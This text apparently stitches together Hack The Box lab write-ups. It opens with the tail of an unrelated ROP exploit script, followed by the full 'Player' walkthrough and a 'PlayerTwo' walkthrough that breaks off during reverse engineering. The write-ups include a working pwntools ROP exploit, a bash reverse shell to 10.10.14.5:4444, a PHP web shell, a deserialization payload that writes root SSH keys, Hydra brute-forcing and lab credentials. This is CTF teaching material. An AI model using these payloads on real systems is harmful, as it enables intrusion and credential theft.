r = remote("localhost", 8888)
r.send(req)
r.interactive()
The exploit succeeds locally and is ready for remote testing. The MD5 hash of the convert.php  
ﬁle can be found from the shell.
Replace this hash with the one used in the exploit. Next, we need the libc version used by the 
server. The README ﬁle from earlier informed us that the libc being used is 2.28-0ubuntu1 . The 
package for this version can be found here. 
The libc is extracted from the package and the exploit is updated with the changes.
wget https://launchpad.net/ubuntu/+source/glibc/2.28-
0ubuntu1/+build/15300579/+files/libc6_2.28-0ubuntu1_amd64.deb
ar x libc6_2.28-0ubuntu1_amd64.deb
tar xvf data.tar.xz
cp ./lib/x86_64-linux-gnu/libc-2.28.so .
from pwn import * 
'''
0x0000000000405c4b: pop rdi; ret; 
'''
pop_rdi = p64(0x0000000000405c4b)
'''
0x0000000000405c49: pop rsi; pop r15; ret; 
'''
pop_rsi_r15 = p64(0x0000000000405c49)
e = ELF("lfmserver", checksec = False)
write = p64(e.plt['write'])
socket = p64(e.got['socket'])
payload = "A" * 148 
payload += pop_rdi + p64(0x6)
payload += pop_rsi_r15 + socket + "junkjunk"
payload += write
payload = urlencode(payload)
req = "CHECK /convert.php%00{} 
LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\nb56a569c6162f6f04ea
71e581beadf68\n".format(payload)
r = remote("localhost", 8888)
r.send(req)
r.recvlines(4)
r.recv(1)
socket_libc = u64(r.recv(8))
log.success("Leaked socket@libc: {}".format(hex(socket_libc)))
r.close()
libc = ELF("libc-2.28.so", checksec = False)
execvp = libc.symbols['execvp']
socket = libc.symbols['socket']
diff = socket - execvp
execvp_libc = socket_libc - diff
log.info("Execvp@libc: {}".format(hex(execvp_libc)))   
binsh = list(libc.search("/bin/sh\x00"))[0]
diff = socket - binsh
binsh_libc = socket_libc - diff
log.info("/bin/sh address: {}".format(hex(binsh_libc)))
dup2 = p64(e.plt['dup2'])
payload = "A" * 148
payload += pop_rdi + p64(0x6)
payload += pop_rsi_r15 + p64(0x0) + "junkjunk"
payload += dup2
# dup2(6, STDIN)
payload += pop_rdi + p64(0x6)
payload += pop_rsi_r15 + p64(0x1) + "junkjunk"
payload += dup2
# dup2(6, STDOUT)
payload += pop_rdi + p64(binsh_libc)
payload += pop_rsi_r15 + p64(0x0) + "junkjunk"
payload += p64(execvp_libc)
# execvp("/bin/sh", NULL)
payload = urlencode(payload)
req = "CHECK /convert.php%00{} 
LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\nb56a569c6162f6f04ea
71e581beadf68\n".format(payload)
r = remote("localhost", 8888)
We can't access the remote server directly, which means the port will have to be forwarded. This 
can be done via remote SSH forwarding. Start the SSH server and use the following commands 
from the shell.
The command above will forward all connections from our localhost port 8888 to port 8888 on 
10.100.0.1 . 
The exploit was successful and we gained a root shell on the host server. We can execute a bash 
reverse shell for better stability.
r.send(req)
r.interactive()
r.close()
The root folder doesn't contain the ﬁnal ﬂag. Looking at the mounts, it's found that the /dev/sdb  
is mounted on /root . 
This means that the actual root folder could be hiding underneath. We can mount the 
/dev/sda2  in order to access the original root folder.
 
 
 
 
 
 
Player 
5​th​ November 2019 / Document No D19.100.46 
Prepared By: MinatoTW 
Machine Author: MrR3boot 
Difficulty: ​Hard 
Classification: Official 
 
 
Page 1 / 25 
 
 
SYNOPSIS 
Player is a Hard difficulty Linux box featuring multiple vhosts and a vulnerable SSH server.
 
   
 
 
 
 
 
 
 
   
 
 
 
Sensitive information gained from a chat can be leveraged to find source code. This is used to
 
 
 
   
 
 
 
 
 
 
 
 
   
 
 
gain access to an internal application vulnerable to LFI through FFMPEG, leading to credential
 
 
 
 
 
 
 
 
 
 
 
 
 
 
disclosure. The vulnerable SSH server is exploited to login to a Codiad instance, which can be
 
 
 
 
 
 
 
 
 
   
 
 
 
 
 
used to gain a foothold. Process enumeration reveals a cron job which executes a script that is
 
 
   
 
 
 
   
 
 
 
   
 
   
vulnerable to PHP deserialization. The script is exploited to write files and gain a shell as root. 
 
Skills Required 
●
Enumeration 
●
PHP serialization 
 
Skills Learned 
●
Vhost enumeration 
●
Creating JWT Cookies 
●
LFI through FFMPEG  
 
 
 
 
 
 
 
 
 
 
Page 2 / 25 
 
Enumeration 
Nmap 
 
ports=$(nmap -p- --min-rate=1000  -T4 10.10.10.145 | grep ^[0-9] | cut -d '/' -f 1 
| tr '\n' ',' | sed s/,$//) 
nmap -p$ports -sC -sV 10.10.10.145 
 
 
We see SSH and Apache services running on their common ports. Additionally, there’s an SSH 
server running on port 6686. 
 
 
Page 3 / 25 
 
Apache 
Browsing to port 80, we receive a 403 forbidden message. 
 
 
 
We see the same response even after adding the player.htb vhost to /etc/hosts. 
Gobuster 
We can run gobuster against the web server, using 100 threads. 
 
It finds a folder named launcher. Navigating to the folder in the browser we find a page titled 
“PlayBuff”. 
Page 4 / 25 
 
 
 
After entering an email and intercepting in Burp, we see it sending a request to a PHP page with 
a cookie named “access”. 
 
 
 
The cookie is in a standard JWT format with three parts. Let’s decode the second part to view the 
values. 
Page 5 / 25 
 
 
It contains the attributes “project” and “access_code”. In order to create our own cookie, we’ll 
need the secret key which is used to sign it.  
Vhost enumeration 
Wfuzz can be used to enumerate vhosts. The Host header can be used to fuzz vhosts using a 
wordlist. The --sc flag is used to display results which return 200. 
 
Wfuzz found two vhosts i.e “chat” and “dev”. Add these to the hosts file and proceed to view 
them in the browser. The dev vhost contains a login page, and examination of the JS files reveals 
a Copyright notice. 
Page 6 / 25 
 
 
According to this, the server is running Codiad. 
The GitHub repo for the project can be found ​here​. Looking at the README file, we see that it’s 
not updated anymore. 
 
 
An exploitation PoC can be found ​here​. However, as it is an authenticated RCE, we’ll have to find 
credentials first.  
Looking at the chat.player.htb vhost we see a message. 
 
 
Page 7 / 25 
 
According to this, “staging” is exposing sensitive files and the main domain is exposing source 
code. Maybe, staging is another vhost? Let’s add it to the hosts file and take a look. 
 
 
It contains some static pages along with a contact page. 
 
After entering details and submitting, we’re redirected to a page with an error. Intercepting the 
request in Burp, we see the following message: 
 
Page 8 / 25 
 
We see two file names referenced, i.e. /var/www/backup/service_config and 
/var/www/staging/fix.php. Let’s save these for later. 
The message also mentioned source code leakage on the main vhost. It is possible that manual 
file backups are created, or as files are edited, temporary or backup files may also be created. 
This is a risk if they are edited in place in the web root, as these files can be discovered and 
downloaded. Example extensions are .bak, .phps, or a ‘~’ at the start or end of the filename. After 
trying this on the PHP files from the main vhost, the source code for one file is returned. 
 
 
 
Here are the contents of the dee8dc8a47256c64630d803a4c40786c.php file. 
 
<?php 
require​ ​'vendor/autoload.php'​; 
 
use​ \​Firebase​\​JWT​\​JWT​; 
 
if​(​isset​($_COOKIE[​"access"​])) 
{ 
    $key = ​'_S0_R@nd0m_P@ss_'​; 
    $decoded = JWT::decode($_COOKIE[​"access"​], base64_decode(strtr($key, ​'-_'​, 
'+/'​)), [​'HS256'​]); 
    ​if​($decoded->access_code === ​"0E76658526655756207688271159624026011393"​) 
    { 
 
 header(​"Location: 7F2xxxxxxxxxxxxx/"​); 
    } 
    ​else 
    { 
 
 header(​"Location: index.html"​); 
    } 
} 
<SNIP> 
Page 9 / 25 
 
We can see the secret key along with the access code required to create a valid JWT cookie. If 
the cookie is properly signed, then we get redirected to a hidden location or else index.html.  
We can create our own JWT cookies using ​this​ website. We already know that the signing 
algorithm is HS256. First, set the payload data to a valid access code. 
 
Next, copy the key into the input box and select “base64 encoded secret”. 
 
This will automatically create the valid cookie on the left-hand side. It can be swapped with the 
invalid cookie in the browser’s storage tab. 
 
 
 
Sending the email request once again should redirect us to the upload page. 
Page 10 / 25 
 
 
Trying to upload any file results in the following message. 
 
 
Clicking on the link returns a 404 Not Found error.  
 
 
 
Looking at the extension “avi” we can assume that the page is compressing video files. Let’s try 
uploading a valid avi file which can be found ​here​. After uploading and clicking on the link, the 
page should return a video. 
Page 11 / 25 
 
 
LFI through FFMPEG exploitation 
Running exiftool on the downloaded file, we see that the Video codec is FMP4. Searching about 
it we find that FMP4 stands for ​F​FMpeg ​MP​EG-​4 ​and is used by FFMPEG. An LFI vulnerability 
exists in ​FFMPEG​, which can be used to read arbitrary files after conversion. The exploit script 
can be downloaded from ​here​. Lets try reading the contents of /etc/passwd. 
 
Upload this malicious AVI to the website and download the converted video. Playing the video 
should show the contents of the passwd file. 
 
Page 12 / 25 
 
Having confirmed the LFI, we can turn our attention to reading sensitive files. Recalling the 
information leak on the staging server, the file names ​/var/www/backup/service_config​ and 
/var/www/staging/fix.php​ were exposed. Let’s try reading these using the LFI. 
 
We generate two files and upload them. The service_config file returns credentials for the user 
telegen. 
 
The fix.php file returned an empty input which means either it doesn’t exist or we don’t
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
have
the
permissions
to
read
it.
Let’s
logging
in
through
SSH
with
the
credentials
 
 
 
 
 
 
 
 
 
 
 
 
 
 
telegen / d-bC|jC!2uepS/w. 
 
 
 
 
 
Page 13 / 25 
 
Foothold 
The login fails on port 22, but is successful on the other SSH server running on the box. 
 
However, the SHELL assigned to us is a restrictive lshell. Looking at the available commands we
 
 
 
 
 
     
 
 
 
 
 
 
 
 
see these. 
 
These won’t help us to escape the restricted shell. Let’s take a step back, and examine the SSH
 
 
 
 
 
 
 
 
 
 
   
 
 
 
 
 
 
server versions reported by nmap. Port 22 is running OpenSSH version 6.6.1p1 while port 6686 is
 
 
 
 
 
 
   
 
 
 
 
 
 
   
running version 7.2. Searching for vulnerabilities in these we come across an ​authenticated
 
 
 
 
 
 
 
 
 
 
 
 
 
command injection in version 7.2. As we already have user credentials, we can try using the
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
script to check if the server is vulnerable. 
Page 14 / 25 
 
 
The script worked, and we are able to read the passwd file. 
 
 
 
 
 
 
 
 
 
 
Page 15 / 25 
 
Lateral Movement 
Let’s try reading the fix.php file, which wasn’t possible using the file upload vulnerability.  
 
The file does exist and we can see credentials for “peter” commented out in the script. We can’t
 
 
 
 
 
 
 
 
 
 
 
 
   
 
 
 
 
SSH in with these credentials, as this user doesn’t exist on the system. 
Let’s try logging into the “dev” vhost with the credentials ​peter / CQXpm\z)G5D#%S$y= ​. 
Page 16 / 25 
 
 
 
The login was successful and we have gained access to the IDE. Let’s try using the Codiad
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
exploit we found earlier. The script can be downloaded from ​here​. 
 
After executing the commands specified by the listener we should receive a shell. 
 
Page 17 / 25 
 
Privilege Escalation 
We can now spawn a TTY shell and try to switch to telegen using the su command.  
 
We were able to switch but land in the restricted shell once again. Looking at the man ​page​ of 
the su command, we come across the -s option. 
 
It can be used to specify the shell to execute instead of the default shell assigned to the user. 
Let’s specify /bin/bash in our command. 
Page 18 / 25 
 
 
This time we were able to switch successfully and bypass the restricted shell . Let’s enumerate 
the running processes and cron jobs using ​pspy​. 
 
Transfer it to the box and execute it. Among other events, we see this: 
 
2019/11/05 17:56:01 CMD: UID=0
PID=9553   | CRON 
2019/11/05 17:56:01 CMD: UID=0
PID=9555   | /usr/bin/php 
/var/lib/playbuff/buff.php 
2019/11/05 17:56:01 CMD: UID=0
PID=9554   | /bin/sh -c /usr/bin/php 
/var/lib/playbuff/buff.php > /var/lib/playbuff/error.log 
2019/11/05 17:56:02 CMD: UID=0
PID=9558   | sleep 5 
 
The cron executes the command “php /var/lib/playbuff/buff.php >  /var/lib/playbuff/error.log” as 
root. 
Page 19 / 25 
 
 
We see four files in the folder and telegen owns the merge.log file. Let’s look at the buff.php file.  
 
<?php 
include​(​"/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php"​); 
class​ ​playBuff 
{ 
 
public​ $logFile=​"/var/log/playbuff/logs.txt"​; 
 
public​ $logData=​"Updated"​; 
 
 
public​ ​function​ ​__wakeup​() 
 
{ 
         file_put_contents(​__DIR__​.​"/"​.​$this​->logFile,​$this​->logData); 
 
} 
} 
$buff = ​new​ playBuff(); 
$serialbuff = serialize($buff); 
$data = file_get_contents(​"/var/lib/playbuff/merge.log"​); 
if​(unserialize($data)) 
{ 
 
$update = file_get_contents(​"/var/lib/playbuff/logs.txt"​); 
 
$query = mysqli_query($conn, ​"update stats set status='$update' where 
id=1"​); 
 
if​($query) 
 
{ 
 
echo​ ​'Update Success with serialized logs!'​; 
 
} 
} 
Page 20 / 25 
 
else 
{ 
 
file_put_contents(​"/var/lib/playbuff/merge.log"​,​"no issues yet"​); 
 
$update = file_get_contents(​"/var/lib/playbuff/logs.txt"​); 
 
$query = mysqli_query($conn, ​"update stats set status='$update' where 
id=1"​); 
 
if​($query) 
 
{ 
 
echo​ ​'Update Success!'​; 
 
} 
} 
?> 
 
The script creates an object of the class playBuff and then serializes it and stores the result in a 
variable. Then the contents of the file merge.log are read into $data. The unserialize method is 
called with $data as the argument. According to the PHP ​documentation​, the unserialized 
method takes in a serialized string as input and attempts to call __wakeup( ) function. 
 
 
 
Going back to the script, the __wakeup() method is defined as follows. 
 
 
public​ $logFile=​"/var/log/playbuff/logs.txt"​; 
 
public​ $logData=​"Updated"​; 
 
 
public​ ​function​ ​__wakeup​() 
 
{ 
            file_put_contents(​__DIR__​.​"/"​.​$this​->logFile,​$this​->logData); 
 
} 
 
Page 21 / 25 
 
It uses file_put_contents to write “Update” to logs.txt in the same directory (denoted by __DIR__). 
This means that if we can alter $logFile and $logData variables, we can write to any file as root. 
As the logFile is prefixed with /var/log/playbuff we can append “../../” to it traverse folders.  
The following PHP script can be used to create a serialized object. 
 
<?php 
class​ ​playBuff 
{ 
      ​public​ $logFile=​"../../../tmp/proof"​; 
      ​public​ $logData=​"pwned"​; 
      ​public​ ​function​ ​__wakeup​() 
      { 
        file_put_contents(​__DIR__​.​"/"​.​$this​->logFile,​$this​->logData); 
      } 
} 
$buff = ​new​ playBuff(); 
echo​ serialize($buff); 
?> 
 
The payload will write “pwned” to the file at /tmp/proof. Execute the script and redirect the output 
to merge.log. 
 
Next, download this file to the current folder so that it can be read by root. 
Page 22 / 25 
 
 
The file should be created after a while with the expected contents. 
 
Similarly, we can write our public key using the same method. Change the variable $logData to 
contain a public SSH key, and $logFIle to authorized_keys, and then follow the same process. 
 
public​ $logFile=​"../../../root/.ssh/authorized_keys"​; 
public​ $logData=​"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ<SNIP>"​; 
 
We are now able to login as root. 
Page 23 / 25 
 
 
Alternate Method 
At the beginning of the script we see that it includes an external file. 
 
<?php 
include​(​"/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php"​); 
<SNIP> 
 
This file owned and writable by www-data. 
 
This file can be modified as www-data to execute a shell on inclusion. A PHP reverse shell can be 
found ​here​. Download the script and modify the IP address and rename it to 
dee8dc8a47256c64630d803a4c40786g.php. 
 
Switch to the www-data shell and download this script to the launcher folder. 
Page 24 / 25 
 
 
The next time script is executed, we should receive a shell as root. 
 
Page 25 / 25 
 
     PlayerTwo
  23rd June 2020 / Document No D20.100.78
  Prepared By: MinatoTW 
  Machine Author(s):  MrR3boot & b14ckh34rt 
  Diﬃculty: Insane
  Classiﬁcation: Oﬃcial           
 
Synopsis
 
PlayerTwo is an insane diﬃculty Linux machine featuring multiple technologies and 
vulnerabilities. Vhost and directory enumeration yields source code for the protobuf service, that 
is used to query the server. This provides credentials used to login and gain access to ﬁrmware. 
The ﬁrmware is modiﬁed in order to execute commands on the server and gain a foothold. The 
server is found to be passing messages over MQTT, and contain a user's SSH key. This user is 
found to have access to a SUID binary that is vulnerable to multiple vectors, leading to a root 
shell.
Skills Required
 
Web Enumeration
Scripting
Reverse Engineering
Exploit Development
Skills Learned
 
Twirp and Protobuf
MQTT
Heap Exploitation
 
Enumeration
 
Nmap
 
Nmap reveals three open ports corresponding to SSH (22), Apache (80) and a PHP built-in server 
(8545) respectively. The script scan of port 8545 resulted in an error message containing the 
string twirp_invalid_route . Looking up this error bring us to Twirp, which is an RPC framework 
that facilitates service-to-service interaction.
Apache
 
Browsing to port 80 reveals an image describing an error. 
ports=$(nmap -p- --min-rate=1000 -T4  10.10.10.170 | grep ^[0-9] | cut -d '/' -f 
1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.10.170
The error asks us to contact MrR3boot@player2.htb . It's possible that the server uses vhost 
based routing. Let's add the following entry to the hosts ﬁle and browse to it.
This time we see a web page instead of the error image.
The page refers to the company's adoption of the protobs  protocol, which has been customized.
10.10.10.170    player2.htb
Vhost Enumeration
 
Let's use wfuzz  to discover any other vhosts. We can use this subdomains wordlist from SecLists 
to bruteforce the vhosts.
The command above discovers vhosts of the form FUZZ.player2.htb  where FUZZ  is replaced 
with words from the wordlist. On running the scan initially, the default response size is found to 
be 102, which is hidden from the results.
The scan was able to discover the subdomain product.player2.htb . Let's add this entry to the 
hosts ﬁle.
Browsing to the vhost reveals a login page titled Protobs Portal , which is the product 
mentioned earlier.
wfuzz -w subdomains-top1million-5000.txt -t 100 -H "Host: FUZZ.player2.htb" --hh 
102 -u http://10.10.10.170
10.10.10.170    player2.htb product.player2.htb
Gobuster
 
Let's enumerate ﬁles and folders on both vhosts using Gobuster, as we don't have any 
credentials at this point.
player2.htb  is found to host two interesting folders, i.e. generated  and proto . Let's note this 
and move to the product  vhost.
The scan revealed a few interesting entries. Browsing to /mail , /totp  and /home  redirects us 
back to the login page. However, the /api  folder returns a 403 error.
Let's scan this folder next.
gobuster dir -u http://player2.htb -w /usr/share/wordlists/dirbuster/directory-
list-1.0.txt -t 50 -x php
The /api  folder is found to contain a /totp  endpoint, which return a 200 OK . Let's navigate to 
this in the browser.
The API throws an error on sending a GET request. Let's send a POST request using curl.
This time we come across a diﬀerent error, stating that we have an Invalid Session . Searching 
about TOTP yields this wiki, according to which the Time-based One-time Password algorithm 
(TOTP) is used to generate One Time Passwords (OTP) based on the current time.
Twirp
 
Accessing the TOTP service might need authorization or further access. Let's enumerate port 
8545  for any interesting information. Looking at the Twirp documentation, it's found that 
services are deﬁned in .proto  ﬁles. We recall seeing a /proto  folder from previous fuzzing of 
the main vhost. It's possible that this folder could contain such ﬁles.
We were able to ﬁnd a ﬁle named generated.proto . Let's look at its contents.
The ﬁle deﬁnes a service called  Auth  for the twirp.player2.auth  package. The service deﬁnes 
a method GenCreds()  which takes in the count (Number) and returns credentials (Creds).
We can use this ﬁle to generate a client for this service. This can be done in various languages 
such as Go, Python, PHP etc. This tutorial describes how the cURL can be used to interact with 
services. 
The protoc  compiler can be downloaded from the GitHub releases.
Let's issue a request for credentials.
This returns credentials in a name, pass  value pair. Issuing repeated requests returns random 
credential pairs for multiple users. Trying to login with these credentials results in failure.
mkdir proto; cd proto
wget 
https://github.com/protocolbuffers/protobuf/releases/download/v3.12.3/protoc-
3.12.3-linux-x86_64.zip
unzip protoc-3.12.3-linux-x86_64.zip
curl -s -X POST -H "Content-Type: application/protobuf" 
http://player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds | ./bin/protoc -I 
. --decode twirp.player2.auth.Creds generated.proto
Let's create a script to send 100 requests, which will hopefully capture all credentials stored by 
the service. We can use gawk  to edit the generated userpass.txt  in place, leaving only unique 
combinations.
After issuing chmod +x client.sh  and running it, the following unique credentials are found.
#/usr/env/bash
echo "Finding Credentials..."
for i in `seq 1 100`
do
  curl -s -X POST -H "Content-Type: application/protobuf" 
http://player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds \
  | ./bin/protoc -I . --decode twirp.player2.auth.Creds generated.proto \
  | tr '\n' ' ' >> userpass.txt
  echo >> userpass.txt
done
echo "Unique Credentials:"
gawk -i inplace '!a[$0]++' userpass.txt
cat userpass.txt
It's not eﬃcient to test these credentials manually, so let's transform the data into a format that 
can be used with Hydra, in an online brute force attack.
The command above converts the username and password pair into the form 
username:password .
Next, the following Hydra command can be used to bruteforce the login.
The command reads credentials from the userpass  wordlist and attempts to login. The failure 
message is set to Nope , which is used to determine the login success.
cat userpass.txt | awk '{print $2,$4}' | sed 's/"//g' | sed 's/ /:/g' | sponge 
userpass.txt
hydra -C userpass.txt product.player2.htb http-post-form 
"/index:username=^USER^&password=^PASS^&Submit=Sign in:Nope"
We were able to two sets of valid credentials. The credentials 0xdf / XHq7_WJTA?QD_?E2  are 
accepted, which takes us to the Two-Factor Authentication (2FA) step. The page asks us to provide 
either an OTP or a backup code.
We came across the /api/totp  endpoint during previous enumeration. 
Let's try to request this endpoint through the current authenticated session. Turn on Burp 
intercept and request the /api/totp  endpoint through the browser. 
Hit CTRL + R  to send the request to Repeater. Next, right-click and select Change request 
method  to switch it to POST.
This time the page returns Invalid action  instead of Invalid session . Let's try sending a 
JSON with an action  ﬁeld.
The API responds with Missing parameters . We can try requesting for various actions such as 
otp , totp , backup  etc. which make sense in the context. It's found that the action 
backup_codes  returns successfully.
Entering the provided code into the 2FA prompt provides access to the home page.
Alternate 2FA Bypass
 
It's possible that the server compares the input action with the string backup_codes . We can try 
bypassing the check through PHP type juggling. Let's set the action to a non-string value such as 
true , which is a boolean.
This passed the action check and we received the backup code. Here's how the application code 
might look. 
The ==  operator in PHP represents loose comparison. Setting $action  to true  satisﬁes the 
check because PHP treats any kind of string as a true value. 
Firmware Analysis
 
That gives us access to the protobs interface. Clicking on the Access  tab reveals a hyperlink to a 
PDF ﬁle.
if($action == "backup_codes") {
    // Send backup code
}
This contains documentation of the Protobs Firmware .
The document describes how the ﬁrmware is signed and veriﬁed in order to prevent counterfeits.
According to the document, the signature is calculated and prepended to the actual code i.e. the 
binary data. 
The ﬂowchart above describes how the update and signature veriﬁcation takes place. It can be 
seen that the ﬁrmware is booted after the signature veriﬁcation.
Looking at the bottom of the document, we come across a URL for the ﬁrmware as well as a 
/protobs  page.
Browsing to the /protobs  page reveals a ﬁrmware veriﬁcation application.
Let's download and inspect the ﬁrmware locally. 
The info.txt  ﬁle contains licensing information while the version  ﬁle records the ﬁrmware 
version as FIRMWAREVERSION=122.01.14,,703021, . Let's upload this tar  ﬁle to the veriﬁcation 
page and look at the response. 
wget http://product.player2.htb/protobs/protobs_firmware_v1.0.tar
tar xvf protobs_firmware_v1.0.tar
The checks pass and the ﬁrmware is ready to be deployed. Let's inspect the binary ﬁle 
Protobs.bin .
It appears to be just data. However, running binwalk on the ﬁle shows that there's an ELF present 
at an oﬀset of 64 bytes. 
The document stated that the signature is present before the actual ﬁrmware code, which means 
that the ﬁrst 64 bytes constitute the signature. We can extract the binary using the following 
command.
This time the ﬁle is successfully recognized as an ELF (executable binary). Let's open it up in 
Ghidra to look at the disassembly. Expand the symbol tree in the code browser and select the 
main  function.
The main()  function calls wait_for_fkey()  and then continues execution. Let's look at the 
wait_for_fkey()  method.
binwalk --dd='.*' Protobs.bin
This method uses the system()  function to change terminal settings using the stty  command.  
We already know that the ﬁrmware is booted after veriﬁcation, this gives us the chance to tamper 
with the code and execute malicious commands. 
Looking at the signing process above, we see that the signature is calculated using the program 
code and a hashing function. It's possible that the server might overlook some of the initial bytes 
of the program code, which will let us bypass the veriﬁcation.
We can use a hex editor such as HxD or 010 Editor to modify the ﬁrmware. Make a backup of 
Protobs.bin , open the original ﬁle in the editor and search for the string stty .
Let's replace the string with a command such as:
Copy the command and paste it while the cursor is at stty .
Hit Ctrl +S  to save the changes, and then use tar  to package the ﬁrmware.
Start a tcpdump  listener and upload this ﬁrmware to the veriﬁcation page.
The signature should be veriﬁed successfully and the server should ping us back.
ping -c 2 10.10.14.5;
tar cvf firmware.tar Protobs.bin info.txt version
Foothold
 
Having conﬁrmed command execution, we can now try to gain a reverse shell. Repeat the 
process above and replace the command with a bash reverse shell.
Save the ﬁrmware and archive it once again. A listener is stood up on port 4444 and the archive is 
uploaded. 
A shell as www-data  is received. 
Looking at the running processes, we see that mosquito  is running locally. 
bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1";
Mosquito is an open-source MQTT broker used to pass messages when using devices or sensors. 
It uses the mqtt protocol, which is based on a publish-subscribe model. Each client can subscribe 
to topics, as well as publish information pertaining to those topics.
Netstat shows port 1883  to be open, which is reserved with IANA for use with MQTT, and the 
default port for the mosquito server.
Alternate Method
 
After getting a shell, we can take a look at the source. Inspecting the contents of 
/var/www/product/protobs/verify.php  we see the ﬁle upload logic.
<?php
<SNIP>
$filename = $_FILES["firmware"]["name"];
$uplfile = "uploads/".$filename;
move_uploaded_file($_FILES["firmware"]["tmp_name"],$uplfile);
if(file_exists($uplfile))
{
   $newfile = rand().'.tar';
   rename($uplfile,"uploads/".$newfile);
   $newfile = "uploads/".$newfile;
   $phar = new PharData($newfile);
   $phar->extractTo("uploads/");
   exec('rm uploads/info.txt');
   exec('rm uploads/version');
   exec('rm '.$newfile);
   echo '<script>alert("Verifying signature of the firmware")</script>';
   $efile = rand().'.bin';
   exec('mv uploads/Protobs.bin uploads/'.$efile);
   exec('./verify_signature.py uploads/'.$efile);
   $verified = "uploads/".$efile.".verified";
   if(file_exists($verified))
   {
      echo '<script>alert("It looks legit. Proceeding for provision test");
</script>';
      exec('chmod +x uploads/'.$efile.'.verified');
      exec('uploads/'.$efile.'.verified > /dev/null 2>&1 &');
      exec('rm uploads/*');
      echo '<script>alert("All checks passed. Firmware is ready for 
deployment.");window.location="/protobs/";</script>';
   }
<SNIP>
The uploaded archive is moved to the uploads  folder, and then its contents are extracted using 
PharData::extractTo() . Next, the signature is veriﬁed and the ﬁle is executed. Finally, the script 
executes rm uploads/* . This command only deletes the ﬁles that are present in the root 
uploads folder, while ignoring any subfolders and contained ﬁles. We can exploit this by creating 
an archive with a sub-folder and placing a web shell in it.
The commands above will create a folder named shell  with the web-shell exec.php  in it. 
Browse to the upload page and submit this archive. The shell should be accessible once the 
veriﬁcation process completes. 
mkdir shell
echo "<?php system($_GET['cmd']); ?>" > shell/exec.php
tar cvf firmware.tar Protobs.bin info.txt version shell/
Lateral Movement
 
We can use reverse port forwarding it in order to make port 1883 accessible and interact with it. 
First add a new temporary user locally with a fake shell.
The following iptables rules can be used to restrict incoming connections to 10.10.10.170  only.
Ensure that the SSH server is running locally and issue the following command from the shell.
After which, port 1883 should be active on our localhost.
The mosquito_sub utility can be used to subscribe to a particular topic and receive messages.
According to the documentation, the topics within the $SYS  hierarchy are used to retrieve 
information about the broker. Let's try to subscribe to this topic.
iptables -A INPUT -p tcp --dport 22 --source 10.10.10.170 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP
## Use iptables -F to delete rules later
ssh -R 1883:127.0.0.1:1883 temp@10.10.14.5 -N
apt install mosquitto-clients
The #  symbol acts as a wildcard and subscribes to all topics within $SYS .
It's found that the server retrieved a SSH private key and published it to a topic. This key might be 
used for signature veriﬁcation or another purpose. Let's save this key in a ﬁle and look at the 
system users.
We can see the user observer . Let's try to login as this user with the SSH key.
The login was successful and the user ﬂag can be read. 
The Development  folder contains a Protobs release notes PDF. 
mosquitto_sub -t '$SYS/#' -h 127.0.0.1 -p 1883
This can be transferred locally using scp.
scp -i id_rsa observer@player2.htb:~/Development/Protobs-Release-Notes.pdf .
Privilege Escalation
 
Examining the ﬁlesystem for SUID ﬁles reveals a Protobs  binary.
Looking at the binary, it's found to be using a non-system libc that is present in the same folder. 
This can be conﬁrmed by looking at the RUNPATH for the binary.
The RUNPATH  is a hardcoded path where the binary looks for shared libraries. Let's transfer all 
three ﬁles using scp. 
find -perm -4000 2>/dev/null
We can replicate the original folder structure to satisfy the RUNPATH requirement. Looking at the 
libc.so.6  library, it's found to be stripped of symbols. We can download the debug version of 
this library.
The GLIBC version is found to be 2.29-0-ubuntu2 , debug symbols for it can be found here. Let's 
download the package and extract the library from it.
GDB will automatically look in /opt/Configuration_Utility/.debug/  for symbols. We'll be 
using GEF to make debugging easier, the installation instructions for GEF can be found here.
Looking at the PDF that we found earlier, we ﬁnd some details related to Protobs.
The release cycle details inform us about minor bugs in the console utility.
scp -i id_rsa observer@player2.htb:/opt/Configuration_Utility/Protobs .
scp -i id_rsa observer@player2.htb:/opt/Configuration_Utility/libc.so.6 .
scp -i id_rsa observer@player2.htb:/opt/Configuration_Utility/ld-2.29.so .
wget http://launchpadlibrarian.net/418347029/libc6-dbg_2.29-0ubuntu2_amd64.deb
ar x libc6-dbg_2.29-0ubuntu2_amd64.deb
tar xvf data.tar.xz
cd ./usr/lib/debug/lib/x86_64-linux-gnu/
mkdir /opt/Configuration_Utility/.debug
cp libc-2.29.so /opt/Configuration_Utility/.debug/
Reverse Engineering
 
We can examine the binary protections using checksec . This reveals that all protections except 
PIE are enabled.
As the binary isn't PIE (Position Independent Executable) compatible, it will always load at the 
same memory address i.e. 0x3fe000 . The Full RELRO  protection will prevent us from 
overwriting GOT addresses in the binary. Let's execute it and look at the program ﬂow.
The binary allows us to create, read, delete and list conﬁgurations.
While creating a conﬁguration, we're prompted for various attributes as well as a description. The 
binary asks us for the size of description before taking in the contents. 
As we can see in the image above, the description was trimmed down to 10 characters. Let's 
open it up in the Ghidra code browser for further analysis. Find the entry  function in the symbol 
tree. The ﬁrst argument in the call to _libc_start_main()  is always the main function.
Double-click on it to navigate to the function, and then type L  to rename it to main . 
Looking at the function, we see it setting up the buﬀers, sleeping and printing messages. It then 
calls a function FUN_004009c7() . This function just prints ASCII art and returns.
It then drops into a loop with another function. This must be the function where main operation 
takes place. Looking at the function, we see that it takes in user input and calls functions based 
on that.
Note: The functions were renamed to depict their actual actions.
The menu()  function just prints the menu and returns. The list_configs()  function loops 
through a global array that stores all user generated conﬁgurations. It lists out all active 
conﬁgurations along with their index.
It appears that the binary allows a maximum of 15 conﬁgurations to be created. Let's look at the 
create_config()  function next.
The function calls get_last_config()  to ﬁnd the index of the last created conﬁguration. The 
program exits if there are 15 conﬁgurations already. Next, it calls malloc()  to allocate a chunk of 
size 0x38 . This chunk address is added to the global array and assigned to the configuration  
struct. 
